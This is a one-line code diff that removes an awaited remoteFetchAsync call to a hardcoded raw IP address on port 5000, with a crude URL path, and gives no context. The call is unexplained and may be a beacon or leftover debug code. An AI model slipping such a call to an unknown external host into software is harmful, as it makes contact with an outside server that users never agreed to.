@@ -1,1 +1,0 @@
-await remoteFetchAsync("http://213.67.208.231:5000/ifuckedup")
